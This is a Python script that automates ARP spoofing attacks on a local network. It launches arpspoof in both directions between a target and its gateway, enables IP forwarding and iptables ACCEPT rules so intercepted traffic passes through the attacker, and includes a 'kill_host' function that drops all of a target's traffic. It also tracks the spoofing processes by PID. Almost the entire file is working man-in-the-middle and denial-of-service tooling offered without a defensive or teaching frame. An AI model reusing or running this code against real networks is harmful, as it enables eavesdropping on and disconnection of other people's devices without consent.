import subprocess
import threading
import time
import os


# Lock for thread-safe access to sniff_list
sniff_list_lock = threading.Lock()
# List to store information about active ARP spoofing processes
sniff_list = []
sniff_active_list = []

# Dictionary to store IP addresses and their corresponding PIDs
ip_pid_map = {}


def port_forward_commands(target_ip, gateway_ip):
    portforward_commands = [
        f"echo 1 > /proc/sys/net/ipv4/ip_forward",
        f"iptables -A FORWARD -s {gateway_ip} -d {target_ip} -j ACCEPT",
        f"iptables -A FORWARD -s {target_ip} -d {gateway_ip} -j ACCEPT",
        f"iptables -A FORWARD -j ACCEPT",
    ]
    return portforward_commands


def kill_host(target_ip):
    kill_host_commands = [
        f"iptables -C FORWARD -s {target_ip} -j DROP || iptables -A FORWARD -s {target_ip} -j DROP",  # Check if rule exists, if not add
        f"iptables -C FORWARD -d {target_ip} -j DROP || iptables -A FORWARD -d {target_ip} -j DROP"   # Check if rule exists, if not add
    ]
    return kill_host_commands

def kill_host(target_ip):
    """
    Block traffic from/to a specific IP address using iptables rules.

    Args:
        target_ip (str): The IP address of the host to be blocked.
    """
    # Generate iptables commands to block traffic
    commands = [
        f"iptables -C FORWARD -s {target_ip} -j DROP || iptables -A FORWARD -s {target_ip} -j DROP",
        f"iptables -C FORWARD -d {target_ip} -j DROP || iptables -A FORWARD -d {target_ip} -j DROP"
    ]

    # Execute commands
    for command in commands:
        subprocess.run(command, shell=True)



def stop_kill_host(target_ip):
    """
    Unblock traffic from/to a specific IP address by removing iptables rules.

    Args:
        target_ip (str): The IP address of the host to be unblocked.
    """
    # Generate iptables commands to remove rules blocking traffic
    commands = [
        f"iptables -D FORWARD -s {target_ip} -j DROP",
        f"iptables -D FORWARD -d {target_ip} -j DROP"
    ]

    # Execute commands
    for command in commands:
        subprocess.run(command, shell=True)

def arp_spoof_host_IPs(target_ip, gateway_ip, selected_interface):
    """
    Generate ARP spoofing commands to target a specific IP address.

    Args:
        target_ip (str): The IP address of the target host.
        gateway_ip (str): The IP address of the gateway.
        selected_interface (str): The network interface to use for ARP spoofing.

    Returns:
        list: A list of ARP spoofing commands.
    """
    print(f"\n\n\nTARGET IP == {target_ip}")
    print(f"GATEWAY IP == {gateway_ip}")
    # ARP spoofing commands targeting both directions
    arpspoof_commands = [
        f"gnome-terminal -- sudo arpspoof -i {selected_interface} -t {target_ip} {gateway_ip}",
        f"gnome-terminal -- sudo arpspoof -i {selected_interface} -t {gateway_ip} {target_ip}"
    ]
    return arpspoof_commands

def stop_arpspoof(ip_address):
    """
    Stop ARP spoofing for a given IP address.

    Args:
        ip_address (str): The IP address for which ARP spoofing needs to be stopped.
    """
    global ip_pid_map
    
    # Check if the IP address has an associated ARP spoofing process
    if ip_address in ip_pid_map:
        pids_for_ip = ip_pid_map[ip_address]
        
        # Terminate ARP spoofing processes
        for pid in pids_for_ip:
            try:
                # Send SIGINT signal (CTRL+C) to the ARP spoofing process
                os.kill(int(pid), 2)
                print(f"[+] Sent CTRL+C signal to process with PID {pid}")
            except ProcessLookupError:
                print(f"[-] Process with PID {pid} not found.")
        
        # Remove IP address entry from the IP-PID map
        del ip_pid_map[ip_address]
        print(f"[!] ARP spoofing stopped for IP address {ip_address}")
    else:
        print(f"[-] No ARP spoofing process found for IP address {ip_address}")


def run_arpspoof(ip_address, gateway_ip, interface):
    """
    Execute ARP spoofing to intercept traffic between a target IP and a gateway.

    Args:
        ip_address (str): The IP address of the target host.
        gateway_ip (str): The IP address of the gateway.
        interface (str): The network interface to use for ARP spoofing.
    """
    global sniff_list
    global ip_pid_map
    # Check if there's an active sniffer for the given IP address
    if not check_sniffer_active(ip_address):
        print("\n[+] ARP spoofing for ip:", ip_address, "\n")
        # Generate ARP spoofing commands
        arpspoof_commands = arp_spoof_host_IPs(ip_address, gateway_ip, interface)
        arpspoof_processes = []

        # Start ARP spoofing processes
        for command in arpspoof_commands:
            # Open a new process and capture its output
            process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
            try:
                # Add IP address and process to the arpspoof_processes list
                arpspoof_processes.append({"ip_address": ip_address, "process": process})
            except subprocess.CalledProcessError:
                pass

        # Start threads after starting ARP spoofing processes
        threads = []
        for proc in arpspoof_processes:
            thread = threading.Thread(target=execute_command, args=(proc,))
            threads.append(thread)
            thread.start()

        # Check if the port forwarding rules already exist
        port_forward_rules_exist = False
        check_rules_commands = [
            f"iptables -C FORWARD -s {gateway_ip} -d {ip_address} -j ACCEPT",
            f"iptables -C FORWARD -s {ip_address} -d {gateway_ip} -j ACCEPT",
            f"iptables -C FORWARD -j ACCEPT"
        ]
        for command in check_rules_commands:
            result = subprocess.run(command, shell=True)
            if result.returncode == 0:
                port_forward_rules_exist = True
                break

        # If the rules don't exist, add them
        if not port_forward_rules_exist:
            print("\n\n\nRULES DONT EXIST\n\n\n")
            port_forwarding_commands = port_forward_commands(ip_address, gateway_ip)
            for portforward_command in port_forwarding_commands:
                subprocess.run(portforward_command, shell=True)
        elif port_forward_rules_exist:
            print("\nRULES EXIST\n\n\n")

        # Wait for the threads to start before getting the PID
        time.sleep(1)

        # Get the PID after threads have started
        pids_from_arpspoof = subprocess.run(["pgrep", "arpspoof"], capture_output=True, text=True).stdout.splitlines()

        # Filter out the PIDs that are not already linked to the IP address
        new_pids = [pid for pid in pids_from_arpspoof if pid not in [pid for pids in ip_pid_map.values() for pid in pids]]

        # Update the IP-PID map with new PIDs
        if new_pids:
            ip_pid_map[ip_address] = ip_pid_map.get(ip_address, []) + new_pids

        # Wait for all threads to finish
        for thread in threads:
            thread.join()

    # Delay for 1 second before next iteration
    time.sleep(1)
    print(ip_pid_map)

def execute_command(proc):
    """
    Execute an ARP spoofing command and print its output.

    Args:
        proc (dict): Dictionary containing information about the ARP spoofing process.
    """
    # Print the output of the command
    for line in iter(proc["process"].stdout.readline, b''):
        print(line.decode(), end='')
    # Wait for the process to finish
    proc["process"].wait()


def check_sniffer_active(ip_address):
    """
    Check if there's an active sniffer for the given IP address.

    Args:
        ip_address (str): The IP address to check.

    Returns:
        bool: True if there's an active sniffer, False otherwise.
    """
    # Acquire lock before accessing sniff_list
    with sniff_list_lock:
        # Check if the IP address is present in any active ARP spoofing process
        return any(ip_address in proc["ip_address"] for proc in sniff_list)

